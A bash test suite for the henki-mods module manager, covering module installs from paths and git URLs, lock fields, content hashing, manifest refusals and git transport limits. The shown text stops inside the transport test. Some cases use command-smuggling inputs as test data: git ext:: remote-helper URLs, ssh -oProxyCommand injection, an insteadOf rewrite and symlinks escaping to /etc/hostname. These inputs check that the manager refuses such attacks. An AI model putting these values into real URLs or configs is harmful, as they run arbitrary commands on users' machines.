#!/usr/bin/env bash
# The tests of henki-mods. Hermetic: every case gets its own HOME, XDG dirs and TMPDIR under one scratch dir, git
# fixtures are repositories this script makes (cloned through file:// URLs), and nothing touches the network or the
# user's config. Bash 3.2 compatible like the manager, so it runs on a stock Mac too.
#
#   manager/tests.sh                    every case, once with bash and once with bash --posix
#   MODS_TEST_HENKI=PATH manager/tests.sh
#       also checks the prompt bytes `list` reports against a real `henki run --json` request, sent to a small
#       python3 stub that records the system prompt (check.sh passes the henki it built)
#
# Exit 0 when every case passes; each failure prints the case, the check and the manager's output.
set -u
export LC_ALL=C
cd "$(dirname "$0")" || exit 1
HERE=$(pwd -P)
MODS="$HERE/henki-mods"
HENKI_BIN=${MODS_TEST_HENKI:-}
# The manager's `henki port` for the conformance suites (test --port, swap); none without MODS_TEST_HENKI.
[ -z "$HENKI_BIN" ] || export HENKI_BIN
unset MODS_TEST_HENKI HENKI_SHARE HENKI_MODS_TTY HENKI_CONFIG GIT_DIR GIT_WORK_TREE
export GIT_CONFIG_NOSYSTEM=1 GIT_AUTHOR_NAME=fixture GIT_AUTHOR_EMAIL=fixture@example.invalid
export GIT_COMMITTER_NAME=fixture GIT_COMMITTER_EMAIL=fixture@example.invalid
SCRATCH=$(mktemp -d "${TMPDIR:-/tmp}/henki-mods-tests.XXXXXX") || exit 1
trap 'chmod -R u+w "$SCRATCH" 2>/dev/null; rm -rf "$SCRATCH"' EXIT
tab=$(printf '\t')
nl='
'
FAILS=0
CASES=0
RUN=bash # the interpreter the manager runs under: bash, then bash --posix

if command -v sha256sum >/dev/null 2>&1; then sha() { sha256sum | awk '{ print $1 }'; }; else sha() { shasum -a 256 | awk '{ print $1 }'; }; fi

# --- the harness -------------------------------------------------------------------------------------------------------

# A case: a fresh HOME (its config dir empty), XDG dirs that are not the defaults, and a work dir W for fixtures.
# XDG_CONFIG_HOME points elsewhere on purpose: henki reads ~/.config/henki, so the manager must too.
case_() {
  CASE="$1"
  CASES=$((CASES + 1))
  local d="$SCRATCH/$CASES"
  mkdir -p "$d/home" "$d/w" "$d/tmp"
  export HOME="$d/home" XDG_DATA_HOME="$d/data" XDG_CONFIG_HOME="$d/xdg-config" XDG_STATE_HOME="$d/state" TMPDIR="$d/tmp"
  W="$d/w"
  CONF="$HOME/.config/henki"
  STORE="$XDG_DATA_HOME/henki/mods"
  unset HENKI_SHARE HENKI_MODS_TTY HENKI_CONFIG
}

# Runs the manager; OUT, ERR, RC.
run() {
  RC=0
  OUT=$($RUN "$MODS" "$@" 2>"$SCRATCH/err") || RC=$?
  ERR=$(cat "$SCRATCH/err")
}
# As run, in the directory DIR.
run_in() { # DIR ARGS
  local d="$1"
  shift
  RC=0
  OUT=$(cd "$d" && $RUN "$MODS" "$@" 2>"$SCRATCH/err") || RC=$?
  ERR=$(cat "$SCRATCH/err")
}

fail() {
  FAILS=$((FAILS + 1))
  printf 'FAIL [%s] %s: %s\n  rc=%s\n  out: %s\n  err: %s\n' "$RUN" "$CASE" "$*" "${RC:-}" "${OUT:-}" "${ERR:-}" | sed '4,$s/^/       /' >&2
}
rc_is() { [ "$RC" = "$1" ] || fail "exit $RC, wanted $1"; }
out_has() { case "$OUT" in *"$1"*) ;; *) fail "stdout lacks: $1" ;; esac; }
err_has() { case "$ERR" in *"$1"*) ;; *) fail "stderr lacks: $1" ;; esac; }
out_lacks() { case "$OUT" in *"$1"*) fail "stdout has: $1" ;; esac; }
err_lacks() { case "$ERR" in *"$1"*) fail "stderr has: $1" ;; esac; }
check() { # DESCRIPTION COMMAND...
  local what="$1"
  shift
  "$@" || fail "$what"
}
# A refusal: exit 1, henki's "henki-mods: PROBLEM; fix: ..." form, and TEXT in it.
refused() {
  rc_is 1
  err_has "$1"
  case "${ERR##*"$nl"}" in "henki-mods: "*"; fix: "*) ;; *) fail "the last line is not a 'henki-mods: PROBLEM; fix: ...' message" ;; esac
}

# A module DIR named by its basename: doc.md (line 1 SUMMARY), bin/NAME (755), a manifest (plus EXTRA lines).
mkmod() {
  local dir="$1" n="${1##*/}" extra="${2:-}"
  mkdir -p "$dir/bin" "$dir/.henki"
  printf '# %s: says hello for tests\n\nThe body is read on demand.\n' "$n" >"$dir/doc.md"
  printf '#!/bin/sh\necho %s\n' "$n" >"$dir/bin/$n"
  chmod 755 "$dir/bin/$n"
  printf 'henki_module = 1\nname = "%s"\nversion = "0.1.0"\nlicense = "0BSD"\ncaps_net = "none"\n%b' "$n" "$extra" >"$dir/.henki/module.toml"
}

# A git repository at DIR from what is already in it; one commit.
mkrepo() {
  git -C "$1" init -q 2>/dev/null || git init -q "$1"
  commit "$1" "first"
}
commit() {
  git -C "$1" add -A 2>/dev/null && git -C "$1" -c commit.gpgsign=false -c core.hooksPath=/dev/null commit -q --no-verify -m "$2" 2>/dev/null
}

num() { printf '%s\n' "$1" | awk '{ s = $0; o = ""; while (length(s) > 3) { o = "," substr(s, length(s) - 2) o; s = substr(s, 1, length(s) - 3) } print s o }'; }
lockline() { awk -F '\t' -v n="$1" '$2 == n' "$CONF/mods.lock" 2>/dev/null; }
field() { lockline "$1" | cut -f "$2"; }

# --- the static check ---------------------------------------------------------------------------------------------------

# Bash 4+ only syntax, which a stock Mac's bash 3.2 does not run (there is no bash 3.2 here to run it under).
static_bash32() {
  case_ "static: no bash 4+ features"
  local f hits
  for f in "$MODS" "$HERE/tests.sh"; do
    hits=$(command grep -nE '(^|[^[:alnum:]_])(mapfile|readarray|coproc)([^[:alnum:]_]|$)|(declare|local|typeset) +-[a-zA-Z]*[An]|\$\{[[:alnum:]_]+(,,?|\^\^?)[}[:alnum:]]|\$\{[[:alnum:]_]+@[QEPAa]\}|\|&|&>>|;;&|\[\[ +-v |\$\{[[:alnum:]_]+\[-[0-9]|EPOCH(SECONDS|REALTIME)|BASHPID|wait +-n|shopt +-s +(globstar|lastpipe|inherit_errexit)|\{[0-9]+\.\.[0-9]+\.\.' "$f" |
      command grep -vE '^[0-9]+:[[:space:]]*#|command grep -nE' || true)
    [ -z "$hits" ] || fail "$f uses bash 4+ syntax:$(printf '\n%s' "$hits")"
  done
  # GNU-only flags and tools, which a Mac lacks.
  for f in "$MODS" "$HERE/tests.sh"; do
    hits=$(command grep -nE '(^|[^[:alnum:]_-])(sed -i|readlink -f|stat -c|grep -P|date -d|mv -T|cp -T|sort -V|realpath|tac|xargs -r)([^[:alnum:]_-]|$)|-printf' "$f" |
      command grep -vE '^[0-9]+:[[:space:]]*#|command grep -nE' || true)
    [ -z "$hits" ] || fail "$f uses a GNU-only tool or flag:$(printf '\n%s' "$hits")"
  done
  # Arrays: an empty one is "unbound" under set -u before bash 4.4, so the manager has none.
  hits=$(command grep -nE '^[^#]*([[:alnum:]_]+=\(|\$\{[[:alnum:]_]+\[)' "$MODS" || true)
  [ -z "$hits" ] || fail "henki-mods uses an array:$(printf '\n%s' "$hits")"
  # awk -v: macOS's awk refuses a value holding a newline and then runs nothing ("newline in string"), and every
  # awk expands backslash escapes in it; mawk and gawk here take both, so only a look at the text finds one.
  hits=$(command grep -nE '^[^#]*(^|[^[:alnum:]_])awk([[:space:]]+-F[[:space:]]*[^[:space:]]+)*[[:space:]]+-v' "$MODS" || true)
  [ -z "$hits" ] || fail "henki-mods passes data to awk with -v (use ENVIRON):$(printf '\n%s' "$hits")"
  bash -n "$MODS" || fail "bash -n henki-mods"
}

# The contracts henki-mods accepts in a manifest are the rows of CONTRACTS.md's index, no more and no fewer: a
# contract added there and not here would refuse every module that names it.
static_contracts() {
  case_ "static: CONTRACTS_KNOWN is the CONTRACTS.md index"
  local doc known
  doc=$(awk '/^## Index$/ { p = 1; next } /^## / { p = 0 } p && /^\| `/ { split($0, c, "`"); print c[2] }' "$HERE/../CONTRACTS.md" | sort)
  known=$(sed -n "s/^CONTRACTS_KNOWN='\(.*\)'$/\1/p" "$MODS" | tr ' ' '\n' | sort)
  [ -n "$doc" ] || fail "CONTRACTS.md has no index rows"
  [ "$doc" = "$known" ] || fail "henki-mods knows [$(echo $known)], CONTRACTS.md's index lists [$(echo $doc)]"
}

# CONTRACTS.md's section NAME, its lines joined by spaces.
doc_sec() { HM_S="## $1" awk '$0 == ENVIRON["HM_S"] { p = 1; next } /^## / { p = 0 } p' "$HERE/../CONTRACTS.md" | tr '\n' ' '; }
# The number of fields of the line format KIND that CONTRACTS.md's section KIND shows in its code block (`KIND F...`).
doc_fields() { HM_K="$1" awk '$1 == ENVIRON["HM_K"] && NF > 3 { print NF; exit }' "$HERE/../CONTRACTS.md"; }

# The other lists henki-mods shares with CONTRACTS.md (the names henki keeps, the observer events, the ports henki
# binds, the text limit), and the conform/1 files against the format.
static_formats() {
  case_ "static: henki-mods' names and the conform/1 suites as CONTRACTS.md has them"
  local ext2 obs port mine doc f line name inst req want save names="" rest
  mine() { sed -n "s/^$1='\(.*\)'.*$/\1/p" "$MODS" | tr ' ' '\n' | sort | tr '\n' ' '; }
  ext2=$(doc_sec ext/2)
  doc=$(printf '%s\n' "$ext2" | sed -n 's/.*CMD as for bin\/, not \([a-z, ]*\) NAME\/cmd.*/\1/p' | sed 's/, / /g; s/ or / /' | tr ' ' '\n' | sort | tr '\n' ' ')
  [ "$doc" = "$(mine RESERVED)" ] || fail "RESERVED is [$(mine RESERVED)], ext/2 keeps [$doc]"
  case "$ext2" in *"at most 16 KiB of UTF-8"*) [ "$(sed -n 's/^DOC_MAX=\([0-9]*\).*/\1/p' "$MODS")" = 16384 ] || fail "DOC_MAX is not 16 KiB" ;; *) fail "ext/2 lost its 16 KiB" ;; esac
  obs=$(doc_sec observe/1)
  doc=$( (HM_S="## observe/1" awk '$0 == ENVIRON["HM_S"] { p = 1; next } /^## / { p = 0 } p && /^\| `/ { split($0, c, "`"); print c[2] }' "$HERE/../CONTRACTS.md"
    printf '%s\n' "$obs" | sed -n 's/.*NAME\/on\/EVENT\.wait  *\([a-z_]*\) and \([a-z_]*\) only.*/\1.wait \2.wait/p' | tr ' ' '\n') | sort | tr '\n' ' ')
  [ "$doc" = "$(mine EVENTS)" ] || fail "EVENTS is [$(mine EVENTS)], observe/1 has [$doc]"
  port=$(doc_sec port/1)
  doc=$(printf '%s\n' "$port" | sed -n 's/.*This henki binds \(.*\) that way.*/\1/p' | awk -F '`' '{ for (i = 2; i <= NF; i += 2) print $i }' | sort | tr '\n' ' ')
  [ "$doc" = "$(mine PORTS_KNOWN)" ] || fail "PORTS_KNOWN is [$(mine PORTS_KNOWN)], port/1 binds [$doc]"
  for f in "$HERE"/conform/*.tsv; do
    names=""
    while IFS= read -r line; do
      case "$line" in '' | '#'*) continue ;; esac
      IFS="$tab" read -r name inst req want save rest <<EOF
$line
EOF
      [ -z "$rest" ] && [ -n "$want" ] || fail "${f##*/}: $name: not 4 or 5 fields"
      case "$inst" in a | b | a! | +[0-9] | +[0-9][0-9]) ;; *) fail "${f##*/}: $name: INST $inst" ;; esac
      case "$req" in hello | '{"method":"'*'","params":'*'}') ;; *) [ "$inst" = a! ] || fail "${f##*/}: $name: REQUEST $req" ;; esac
      case "$save" in '' | [A-Za-z]*=[a-z]*) ;; *) fail "${f##*/}: $name: SAVE $save" ;; esac
      case " $names " in *" $name "*) fail "${f##*/}: $name twice" ;; esac
      names="$names $name"
    done <"$f"
  done
  [ "$(doc_fields bind/1)" = 6 ] && [ "$(doc_fields eval/1)" = 10 ] && [ "$(doc_fields lock/1)" = 11 ] || fail "doc_fields reads $(doc_fields bind/1) $(doc_fields eval/1) $(doc_fields lock/1)"
}

# --- the cases ----------------------------------------------------------------------------------------------------------

t_add_path() {
  case_ "add from a path, --yes"
  mkmod "$W/hello"
  run add "$W/hello" --yes
  rc_is 0
  out_has "hello 0.1.0"
  out_has "license  0BSD"
  out_has "network  none (declared, NOT enforced)"
  out_has "bin/hello (sh, 2 lines)"
  out_has "restart henki (or /exit and start again) to load the change"
  out_lacks "UNREVIEWED"
  local l hd store
  l=$(lockline hello)
  hd=$(field hello 8)
  store="$STORE/hello/$(printf '%s' "${hd#hd1:}" | cut -c1-12)"
  check "11 tab-separated fields, MASK empty" [ "$(printf '%s' "$l" | awk -F '\t' '{ print NF ":" $11 }')" = "11:" ]
  check "lock/1 hello on 0.1.0 path SOURCE - " [ "$(printf '%s' "$l" | cut -f 1-7)" = "lock/1${tab}hello${tab}on${tab}0.1.0${tab}path${tab}$W/hello${tab}-" ]
  check "ADDED is UTC minutes" sh -c "printf '%s' '$(field hello 9)' | command grep -qE '^[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}Z$'"
  check "HOW is yes" [ "$(field hello 10)" = yes ]
  check "the link points at the store copy" [ "$(readlink "$CONF/ext/hello")" = "$store" ]
  check "no file under XDG_CONFIG_HOME" [ ! -e "$XDG_CONFIG_HOME" ]
  check "store files are read-only" [ -z "$(find "$store" ! -type l -perm -200 -print)" ]
  check "store dirs are read-only" [ ! -w "$store/bin" ] || [ "$(id -u)" = 0 ]
  check "no scratch dir left in the store" [ -z "$(find "$STORE" -name '.add.*' -print)" ]
  check "no busy dir left" [ ! -e "$CONF/mods.busy" ]
  run verify
  rc_is 0
  out_has "verify: ok (1 modules)"
  # A path with #SUBDIR, and the same module twice.
  case_ "add DIR#SUBDIR from a path"
  mkmod "$W/repo/mods/hi"
  run add "$W/repo#mods/hi" --yes
  rc_is 0
  check "lock names the dir" [ "$(field hi 6)" = "$W/repo/mods/hi" ]
  run add "$W/repo/mods/hi" --yes
  refused "hi is already added"
}

t_ask() {
  case_ "add asks on the terminal, default no"
  mkmod "$W/hello"
  printf '\n' >"$W/answer"
  HENKI_MODS_TTY="$W/answer" run add "$W/hello"
  refused "not installed (the answer was no)"
  out_has "hello 0.1.0"
  check "nothing linked" [ ! -e "$CONF/ext/hello" ]
  check "no lock line" [ -z "$(lockline hello)" ]
  check "no store copy" [ -z "$(find "$STORE" -mindepth 1 -maxdepth 1 ! -name '.*' -print 2>/dev/null)" ]
  printf 'y\n' >"$W/answer"
  HENKI_MODS_TTY="$W/answer" run add "$W/hello"
  rc_is 0
  check "HOW is tty" [ "$(field hello 10)" = tty ]
  check "on" [ "$(field hello 3)" = on ] && [ -L "$CONF/ext/hello" ]
  case_ "add without a terminal and without --yes"
  mkmod "$W/hello"
  HENKI_MODS_TTY="$W/none" run add "$W/hello"
  refused "no terminal to ask on"
  check "nothing linked" [ ! -e "$CONF/ext/hello" ]
}

t_git() {
  case_ "add from a git URL with @REF and #SUBDIR"
  local r="$W/repo" c1 c2 store
  mkmod "$r/mods/hello"
  printf 'first\n' >"$r/README.md"
  mkrepo "$r"
  git -C "$r" tag v1
  c1=$(git -C "$r" rev-parse HEAD)
  printf '# hello: version two\n' >"$r/mods/hello/doc.md"
  commit "$r" second
  git -C "$r" branch feature/x
  c2=$(git -C "$r" rev-parse HEAD)
  run add "file://$r@v1#mods/hello" --yes
  rc_is 0
  out_has "UNREVIEWED"
  out_has "commit $c1"
  check "SOURCE is URL#SUBDIR" [ "$(field hello 6)" = "file://$r#mods/hello" ]
  check "COMMIT is the tag's commit" [ "$(field hello 7)" = "$c1" ]
  check "KIND url" [ "$(field hello 5)" = url ]
  store="$STORE/hello/$(printf '%s' "$c1" | cut -c1-12)"
  check "store ID is the commit's first 12 hex" [ "$(readlink "$CONF/ext/hello")" = "$store" ]
  check "the copy is the tagged content" command grep -q 'says hello for tests' "$store/doc.md"
  check "nothing outside SUBDIR" [ ! -e "$store/README.md" ] && [ ! -e "$store/mods" ]
  run rm hello
  rc_is 0
  run add "file://$r#mods/hello" --yes
  rc_is 0
  check "no REF: the default branch" [ "$(field hello 7)" = "$c2" ]
  run rm hello
  run add "file://$r@feature/x#mods/hello/" --yes
  rc_is 0
  check "a branch with a slash" [ "$(field hello 7)" = "$c2" ]
  run rm hello
  run add "file://$r@$(printf '%s' "$c1" | cut -c1-10)#mods/hello" --yes
  rc_is 0
  check "a short commit" [ "$(field hello 7)" = "$c1" ]
  run rm hello
  run add "file://$r@nope#mods/hello" --yes
  refused "has no nope to pin"
  run add "file://$r@v1#mods/absent" --yes
  refused "has no directory mods/absent"
  run add "file://$W/no-such-repo" --yes
  refused "git clone"
  # A whole repository is one module; its name comes from the URL.
  case_ "add a whole repository by URL"
  mkdir -p "$W/henki-tool.git"
  mkmod "$W/henki-tool.git/tool"
  mv "$W/henki-tool.git/tool/"* "$W/henki-tool.git/tool/.henki" "$W/henki-tool.git/"
  rmdir "$W/henki-tool.git/tool"
  mv "$W/henki-tool.git/bin/tool" "$W/henki-tool.git/bin/henki-tool"
  sed 's/^name = .*//' "$W/henki-tool.git/.henki/module.toml" >"$W/m" && mv "$W/m" "$W/henki-tool.git/.henki/module.toml"
  mkrepo "$W/henki-tool.git"
  run add "file://$W/henki-tool.git" --yes
  refused "no name"
  rm -rf "$W/henki-tool.git/.henki"
  commit "$W/henki-tool.git" "drop the manifest"
  run add "file://$W/henki-tool.git" --yes
  rc_is 0
  out_has "manifest none (unmanaged"
  check "unmanaged name from the URL, .git dropped" [ -L "$CONF/ext/henki-tool" ]
  check "VERSION -" [ "$(field henki-tool 4)" = - ]
  run list
  out_has "(unmanaged)"
}

t_raw_blobs() {
  case_ "the copy is the raw blobs: 755 kept, links kept, no filters"
  local r="$W/repo" s
  mkmod "$r/tool"
  ln -s tool "$r/tool/bin/tool-alias"
  ln -s ../doc.md "$r/tool/bin/.doc-link"
  printf 'plain\n' >"$r/tool/README.notes"
  chmod 644 "$r/tool/README.notes"
  mkrepo "$r"
  # A clean filter in the user's git config must not touch the copy (no checkout runs it).
  git config --global filter.evil.clean 'echo FILTERED' 2>/dev/null || true
  run add "file://$r#tool" --yes
  rc_is 0
  s=$(readlink "$CONF/ext/tool")
  check "bin/tool keeps its x bit" [ -n "$(find "$s/bin/tool" -perm -100 -print)" ]
  check "README.notes has no x bit" [ -z "$(find "$s/README.notes" -perm -100 -print)" ]
  check "bin/tool-alias is a link to tool" [ -L "$s/bin/tool-alias" ] && [ "$(readlink "$s/bin/tool-alias")" = tool ]
  check "the dot link is kept" [ "$(readlink "$s/bin/.doc-link")" = ../doc.md ]
  check "the blob bytes" [ "$(cat "$s/bin/tool")" = "$(printf '#!/bin/sh\necho tool')" ]
  check "hd1 in the lock is the store's" [ "$(field tool 8)" = "$(hd1_by_hand "$s")" ]
  out_has "files    6 (2 links)"
}

# hd1 the slow way, for comparison: a find, a sort, one sha per entry, by the definition.
hd1_by_hand() {
  local d="$1" p mode h
  (cd "$d" && find . -path ./.git -prune -o \( -type f -o -type l \) -print) | sed 's|^\./||' | sort | while IFS= read -r p; do
    if [ -L "$d/$p" ]; then
      mode=link
      h=$(printf '%s' "$(readlink "$d/$p")" | sha)
    else
      if [ -n "$(find "$d/$p" \( -perm -100 -o -perm -010 -o -perm -001 \) -print)" ]; then mode=755; else mode=644; fi
      h=$(sha <"$d/$p")
    fi
    printf '%s %s %s\n' "$mode" "$h" "$p"
  done | sha | sed 's/^/hd1:/'
}

t_hd1() {
  case_ "hd1 known answer"
  local m="$W/kat"
  mkdir -p "$m/bin" "$m/.henki"
  printf 'doc line\n' >"$m/doc.md"
  printf '#!/bin/sh\n' >"$m/bin/run"
  chmod 750 "$m/bin/run"
  printf 'henki_module = 1\nname = "kat"\nversion = "1"\nlicense = "MIT"\n' >"$m/.henki/module.toml"
  ln -s doc.md "$m/README.md"
  mkdir -p "$m/.git" && printf 'excluded\n' >"$m/.git/HEAD"
  # By the definition, sorted bytewise by hand: ".henki/..." < "README.md" < "bin/run" < "doc.md".
  local want
  want="hd1:$(
    printf '644 %s .henki/module.toml\n' "$(printf 'henki_module = 1\nname = "kat"\nversion = "1"\nlicense = "MIT"\n' | sha)"
    printf 'link %s README.md\n' "$(printf 'doc.md' | sha)"
    printf '755 %s bin/run\n' "$(printf '#!/bin/sh\n' | sha)"
    printf '644 %s doc.md\n' "$(printf 'doc line\n' | sha)"
  )"
  want="hd1:$(printf '%s\n' "${want#hd1:}" | sha)"
  run verify --dir "$m"
  rc_is 0
  out_has "$want"
  run add "$m" --yes
  rc_is 0
  check "the lock has the known answer" [ "$(field kat 8)" = "$want" ]
  check "store ID is the hd1's first 12 hex" [ "$(readlink "$CONF/ext/kat")" = "$STORE/kat/$(printf '%s' "${want#hd1:}" | cut -c1-12)" ]
  check "the hand-rolled hash agrees" [ "$(hd1_by_hand "$(readlink "$CONF/ext/kat")")" = "$want" ]
}

t_refusals() {
  case_ "refusals"
  local m="$W/m"
  mkmod "$W/Bad"
  sed 's/^name = .*/name = "Bad_Name"/' "$W/Bad/.henki/module.toml" >"$W/t" && mv "$W/t" "$W/Bad/.henki/module.toml"
  run add "$W/Bad" --yes
  refused "name: a name is 1 to 32 of a-z"
  rm -rf "$W/Bad/.henki"
  run add "$W/Bad" --yes
  refused "the name \"Bad\""

  mkmod "$m" 'colour = "red"\n'
  run add "$m" --yes
  refused "unknown key colour"
  run verify --dir "$m"
  refused "unknown key colour"

  rm -rf "$m" && mkmod "$m" 'os = ["plan9"]\n'
  run add "$m" --yes
  refused 'os "plan9" is not macos or linux'
  local other=linux
  [ "$(uname -s)" != Linux ] || other=macos
  rm -rf "$m" && mkmod "$m" "os = [\"$other\"]\n"
  run add "$m" --yes
  refused "runs on $other only"
  run verify --dir "$m"
  rc_is 0

  rm -rf "$m" && mkmod "$m" 'henki_module = 2\nrequires = ["henki >= 0.2"]\n'
  sed '1d' "$m/.henki/module.toml" >"$W/t" && mv "$W/t" "$m/.henki/module.toml"
  mkdir -p "$m/cmd"
  run add "$m" --yes
  refused "henki_module = 2 needs henki >= 0.2"

  rm -rf "$m" && mkmod "$m"
  mkdir -p "$m/ctx" && printf 'x\n' >"$m/ctx/x"
  run add "$m" --yes
  refused "ctx/x: a context source is a file you can run"
  rm -rf "$m/ctx" && mkdir "$m/lib" && printf 'x\n' >"$m/lib/x"
  run add "$m" --yes
  refused "lib: unknown entry"

  rm -rf "$m" && mkmod "$m"
  ln -s ../../outside "$m/bin/escape"
  run add "$m" --yes
  refused "leaves the module"
  rm "$m/bin/escape" && ln -s /bin/sh "$m/bin/escape"
  run add "$m" --yes
  refused "is absolute, leaves the module"
  rm "$m/bin/escape" && ln -s ../bin/../../m/doc.md "$m/README.x"
  run add "$m" --yes
  refused "leaves the module"
  # A link to . makes the words lie: README.x/README.x/../.. counts as one level down, and is one up.
  local down="" up="" i
  for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30; do down="${down}README.x/" up="${up}../"; done
  rm "$m/README.x" && ln -s . "$m/README.x" && ln -s "$down${up}etc/hostname" "$m/README.host"
  check "the fixture reaches out" [ "$(cat "$m/README.host")" = "$(cat /etc/hostname)" ]
  run verify --dir "$m"
  refused "README.host: a symlink to README.x/README.x/"
  err_has "goes through another link"
  run add "$m" --yes
  refused "goes through another link"
  check "nothing installed" [ ! -e "$CONF/mods.lock" ]
  # Links to links, and through real directories, are fine.
  rm "$m/README.host" && ln -s README.x "$m/README.y" && ln -s bin/../doc.md "$m/README.z" && ln -s README.y/doc.md "$m/README.w"
  run verify --dir "$m"
  refused "README.w: a symlink to README.y/doc.md"
  rm "$m/README.w"
  run verify --dir "$m"
  rc_is 0
  rm "$m/README.x" "$m/README.y" "$m/README.z"

  printf 'not runnable\n' >"$m/bin/data"
  run add "$m" --yes
  refused "a command is a file you can run"
  rm "$m/bin/data"
  rm "$m/doc.md"
  run add "$m" --yes
  refused "no doc.md"
  printf '#\n' >"$m/doc.md"
  run add "$m" --yes
  refused "line 1 must be a summary of 1 to 160 bytes"
  awk 'BEGIN { for (i = 0; i < 161; i++) printf "x"; print "" }' >"$m/doc.md"
  run add "$m" --yes
  refused "line 1 must be a summary"
  if command -v iconv >/dev/null 2>&1; then
    printf 'zero\342\200\213width\n' >"$m/doc.md"
    run add "$m" --yes
    refused "holds U+200B"
  fi
  printf 'ok\n' >"$m/doc.md"

  rm -rf "$m" && mkmod "$m"
  mkdir "$m/empty"
  run verify --dir "$m"
  refused "empty: unknown entry"
  rmdir "$m/empty" && mkdir "$m/bin/sub"
  run verify --dir "$m"
  refused "bin/sub: a directory"
  rmdir "$m/bin/sub"
  mv "$m/.henki/module.toml" "$m/manifest" && ln -s ../manifest "$m/.henki/module.toml"
  run verify --dir "$m"
  refused "module.toml: not a regular file"

  rm -rf "$m" && mkmod "$m" 'ports = ["history"]\n'
  run add "$m" --yes
  refused "ports must name exactly the programs in port/"
  rm -rf "$m" && mkmod "$m" 'ports = ["frontend"]\n'
  run add "$m" --yes
  refused "port frontend is not one this henki binds (history policy context exec)"
  rm -rf "$m" && mkmod "$m" && mkdir "$m/port" && printf '#!/bin/sh\n' >"$m/port/history"
  run add "$m" --yes
  refused "port/history: port/ holds a program you can run per port"
  chmod 755 "$m/port/history" && mv "$m/port/history" "$m/port/frontend"
  run add "$m" --yes
  refused "port/frontend: port/ holds a program you can run per port, named history policy context exec"
  rm -rf "$m" && mkmod "$m" 'contracts = ["ext/1", "frontend/1"]\n'
  run add "$m" --yes
  refused "contract frontend/1 is not one this henki ships"
  rm -rf "$m" && mkmod "$m" 'caps_net = "lots"\n'
  sed '/^caps_net = "none"/d' "$m/.henki/module.toml" >"$W/t" && mv "$W/t" "$m/.henki/module.toml"
  run add "$m" --yes
  refused 'caps_net "lots"'
  rm -rf "$m" && mkmod "$m" 'license = "MIT"\n'
  run add "$m" --yes
  refused "duplicate key license"
  rm -rf "$m" && mkmod "$m" 'summary = "a \\"quote\\""\n'
  run add "$m" --yes
  refused "escape"
  rm -rf "$m" && mkmod "$m" 'shadow = ["nope"]\n'
  run add "$m" --yes
  refused "a shadow entry is not EXT/COMMAND"
  rm -rf "$m" && mkmod "$m" 'requires = ["itse >= 1"]\n'
  run add "$m" --yes
  refused 'requires "itse >= 1" is not "henki >= VERSION"'
  rm -rf "$m" && mkmod "$m"
  printf 'x\n' >"$m/.henki/notes"
  run add "$m" --yes
  refused ".henki holds module.toml, card.md and template"

  # Nothing of a refused add stays behind.
  check "no link after refusals" [ ! -e "$CONF/ext" ] || [ -z "$(ls "$CONF/ext")" ]
  check "no lock after refusals" [ ! -e "$CONF/mods.lock" ]
  check "no store copy after refusals" [ -z "$(find "$STORE" -mindepth 1 -maxdepth 1 -print 2>/dev/null)" ]

  # A dir in ext/ that henki-mods did not make.
  rm -rf "$m" && mkmod "$m"
  mkdir -p "$CONF/ext/m"
  run add "$m" --yes
  refused "exists and henki-mods did not make it"
  rmdir "$CONF/ext/m"

  # Usage errors exit 2.
  run frobnicate
  rc_is 2
  run on
  rc_is 2
  run add
  rc_is 2
  run add "$m" --force
  rc_is 2
  run on nothing-here
  refused "nothing-here is not added"
}

t_gitattributes() {
  case_ "refuse .gitattributes export-subst (and kin)"
  local r="$W/repo" a
  mkmod "$r/tool"
  printf '* -diff\n' >"$r/.gitattributes"
  printf 'doc.md export-subst\n' >"$r/tool/.gitattributes"
  mkrepo "$r"
  run add "file://$r#tool" --yes
  refused "tool/.gitattributes sets export-subst"
  check "nothing installed" [ ! -e "$CONF/mods.lock" ]
  for a in 'bin/* filter=lfs' '*.md text eol=lf' '# export-subst only in a comment' 'tool/x ident' '[attr]mine export-ignore' \
    '*.md crlf' '*.md -crlf' '*.md crlf=input' '*.md working-tree-encoding=UTF-16'; do
    printf '%s\n' "$a" >"$r/tool/.gitattributes"
    commit "$r" "attrs: $a"
    run add "file://$r#tool" --yes
    case "$a" in
      '#'*) rc_is 0 && run rm tool ;;
      *) refused "sets export-subst, export-ignore, ident, filter, text, eol, crlf or working-tree-encoding" ;;
    esac
  done
  # Attributes of a directory above the module apply to it.
  printf '\n' >"$r/tool/.gitattributes"
  printf 'tool/doc.md export-subst\n' >"$r/.gitattributes"
  commit "$r" "root attrs"
  run add "file://$r#tool" --yes
  refused ".gitattributes sets export-subst"
}

# Only https, http, ssh, git and file reach git; a remote helper (ext::CMD runs CMD at clone time, before the screen
# and the question) is refused by the parser, and git is held to the list too, whatever the config says.
t_transport() {
  case_ "git transports: a remote helper never runs"
  local pw="$W/pwned" u r="$W/repo"
  # ext enabled every way the environment can: the parser must refuse before git sees it.
  for u in "ext::sh -c touch% $pw;% :% a@b:c" "ext::sh -c touch% $pw" "fd::7" "EXT::sh -c touch% $pw" "testing::x@y:z"; do
    GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=protocol.ext.allow GIT_CONFIG_VALUE_0=always run add "$u" --yes
    refused "a git remote helper"
    check "$u ran nothing" [ ! -e "$pw" ]
  done
  for u in "foo://h/x" "HTTPS://h/x" "ftp://h/x" "ssh://-oProxyCommand=touch% $pw/x" "ssh://u@-oProxyCommand=x/y" "a@-oProxyCommand=x:y" "a@b@c:d" "a b@c:d"; do
    run add "$u" --yes
    refused "fix: use an https, http, ssh, git or file URL"
  done
  check "nothing ran" [ ! -e "$pw" ]
  # Past the parser, git is pinned: an insteadOf rewrite of an https URL into ext:: fails, with ext allowed in
  # ~/.gitconfig, in GIT_CONFIG_COUNT and in GIT_CONFIG_PARAMETERS, and GIT_ALLOW_PROTOCOL naming ext.
  git config --global protocol.ext.allow always
  git config --global url."ext::sh -c touch% $pw% #".insteadOf "https://mods.invalid/"
  GIT_ALLOW_PROTOCOL=ext:https GIT_CONFIG_PARAMETERS="'protocol.ext.allow'='always'" \
    GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=protocol.ext.allow GIT_CONFIG_VALUE_0=always run add "https://mods.invalid/x" --yes
  refused "git clone https://mods.invalid/x failed"
  err_has "transport 'ext' not allowed"
  check "the rewritten helper ran nothing" [ ! -e "$pw" ]
  # The allowed ones still work: file:// here, and USER@HOST:PATH goes to ssh (the user's GIT_SSH_COMMAND, kept).
